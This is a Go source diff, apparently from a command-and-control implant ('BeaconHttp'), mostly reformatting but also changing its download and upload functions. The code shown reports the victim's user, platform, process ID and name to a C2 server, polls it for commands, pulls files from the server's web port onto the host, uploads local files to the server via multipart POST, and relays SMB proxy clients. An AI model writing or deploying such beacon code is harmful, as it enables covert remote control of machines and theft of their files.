@@ -1,19 +1,19 @@
 package main
 
 import (
-	"os"
-	"io"
-	"fmt"
 	"bytes"
-	"strings"
-	"net/http"
-	"encoding/json"
-    "mime/multipart"
 	b64 "encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"mime/multipart"
+	"net/http"
+	"os"
+	"strings"
 )
 
 func (packet BeaconHttp) exitHandler() {
-	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"quit",[]byte("quit")})
+	data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "quit", []byte("quit")})
 	debugFatal(err)
 	encoded := b64.StdEncoding.EncodeToString(data)
 	queryCommandHttp(encoded)
@@ -40,7 +40,7 @@ func (packet BeaconHttp) queryServer() {
 		if err != nil || resp.Status != "200 OK" {
 			fmt.Println("Command status != 200: " + resp.Status)
 		}
-		
+
 		controlDataBytes, err := io.ReadAll(resp.Body)
 		debugFatal(err)
 		encData, _ := b64.StdEncoding.DecodeString(string(controlDataBytes))
@@ -58,15 +58,15 @@ func (packet BeaconHttp) addProxyClient(client Beacon) {
 	}
 
 	var data []byte
-	beaconSmbClient := BeaconSmbClient { beacon: client }
+	beaconSmbClient := BeaconSmbClient{beacon: client}
 	err := beaconSmbClient.tryHandshake()
-	
+
 	if err == nil {
 		packet.proxyClients = append(packet.proxyClients, client)
 		beaconSmbClients = append(beaconSmbClients, beaconSmbClient)
-		data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"proxyConnectSuccess",[]byte(client.Id)})
-	} else{
-		data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"proxyConnectFail",[]byte(client.Id)})	
+		data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "proxyConnectSuccess", []byte(client.Id)})
+	} else {
+		data, err = json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "proxyConnectFail", []byte(client.Id)})
 	}
 
 	debugFatal(err)
@@ -87,7 +87,7 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 	return netClient.Do(req)
 }
 
-func (packet BeaconHttp) download(filePath string) {
+func (packet BeaconHttp) download(filePath string) string {
 	filename := filePath
 	if filename[0] == '/' || filename[0] == '~' {
 		f := strings.Split(filename, "/")
@@ -96,7 +96,8 @@ func (packet BeaconHttp) download(filePath string) {
 
 	result := "0"
 
-	url := "http://" + cmdAddress + ":" + cmdPort + "/d/" + b64.StdEncoding.EncodeToString([]byte(filePath))
+	url := "http://" + cmdAddress + ":" + webPort + "/dl/" + filePath
+	fmt.Println(url)
 	req, err := http.NewRequest("GET", url, nil)
 	debugFatal(err)
 	req.Host = "command.com"
@@ -117,7 +118,7 @@ func (packet BeaconHttp) download(filePath string) {
 
 		_, err = io.Copy(out, resp.Body)
 		debugFatal(err)
-		
+
 		if err != nil {
 			continue
 		}
@@ -129,52 +130,53 @@ func (packet BeaconHttp) download(filePath string) {
 
 	result += ";" + targetDir + "/" + filename
 
-	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(result)})
+	data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "upload", []byte(result)})
 	debugFatal(err)
-	
+
 	if err != nil {
-		return
+		return ""
 	}
 
 	encoded := b64.StdEncoding.EncodeToString(data)
 	queryCommandHttp(encoded)
+	return targetDir + "/" + filename
 }
 
 func (packet BeaconHttp) upload(filename string) {
-	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(filename)})
+	data, err := json.Marshal(CommandUpdate{ip, id, curUser, platform, arch, pid, pname, "upload", []byte(filename)})
 	debugFatal(err)
-	
+
 	if err != nil {
 		return
 	}
 
 	encoded := b64.StdEncoding.EncodeToString(data)
-	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
-	
-    var b bytes.Buffer
-    w := multipart.NewWriter(&b)
-    var fw io.Writer
-    file, err := os.Open(filename)
-    debugFatal(err)
-	
+	url := "http://" + cmdAddress + ":" + webPort + "/" + encoded
+
+	var b bytes.Buffer
+	w := multipart.NewWriter(&b)
+	var fw io.Writer
+	file, err := os.Open(filename)
+	debugFatal(err)
+
 	if err != nil {
 		return
 	}
 	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
-    	debugFatal(err)
+		debugFatal(err)
 		return
-    }    
+	}
 	if _, err = io.Copy(fw, file); err != nil {
 		debugFatal(err)
 		return
-    }
+	}
 
-    w.Close()
+	w.Close()
 
 	req, err := http.NewRequest("POST", url, &b)
 	req.Host = cmdHost
 	debugFatal(err)
 	req.Header.Set("Content-Type", w.FormDataContentType())
-    _, err = netClient.Do(req)
+	_, err = netClient.Do(req)
 	debugFatal(err)
 }
